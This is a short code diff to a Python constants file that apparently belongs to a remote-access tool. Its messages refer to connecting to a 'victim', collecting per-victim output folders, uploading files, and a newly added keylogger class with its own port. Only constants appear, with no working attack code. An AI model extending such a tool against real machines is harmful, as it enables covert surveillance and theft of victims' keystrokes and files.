@@ -1,15 +1,15 @@
 
-class ConnectionConstants(object):
+class ConnectionConstants:
     TCP_PORT = 55554
     CONNECTION_FAILED_MSG = "Connection attempt to victim '{}' failed.. "
     SOCKET_TIMEOUT_LENGTH = None #5 # seconds
     CONNECTION_SUCCESS_MSG = "Connected to kli on ip: {}"
     KLI_NOT_RESPONDING_WARNING_MSG = "Kli not responding.. "
 
-class HQConstants(object):
+class HQConstants:
     RELATIVE_PRODUCTS_DIR = r"Products\stuff_[{hostname}@{ip}]"
 
-class SocketHandlerConstants(object):
+class SocketHandlerConstants:
     HANDLER_INITIATE_ERROR_MSG = "SocketHandler argument requirements not satisfied"
     CLIENT_KEY = "client"
     SERVER_KEY = "server"
@@ -17,14 +17,14 @@ class SocketHandlerConstants(object):
     HOSTNAME_KEY = "connect_to"
     SOCKET_TIMEOUT_KEY = "socket_timeout"
 
-class DataTransmissionConstants(object):
+class DataTransmissionConstants:
     RECV_BUFFER_SIZE = 100
     MAX_SENT_DATA_SIZE = 2048
     ACK = "ACK"
     BASE64 = "base64"
     UNKNOWN_COMMAND_RESPONSE_ERROR_MSG = "Unknown command response received.. "
 
-class CommandConstants(object):
+class CommandConstants:
     INVALID_COMMAND_RESPONSE_INDICATOR = "invalid"
     INVALID_COMMAND_SIZE_INDICATOR = 150 # approximately, the reasonable max size of an invalid message
 
@@ -61,4 +61,6 @@ class CommandConstants(object):
     UPLOAD_FILE_FAILED_TO_SAVE_FILE = "Failed to save file in '{0}'..\nError: '{1}'"
     UPLOAD_FILE_FINISHED_SUCCESSFULLY = "File was uploaded successfully to: '{}'"
 
+class KeyLoggerConstants:
     KEYLOGGER_DEFAULT_PORT = 55553
+    KEYLOGGER_SOCKET_TIMEOUT = None
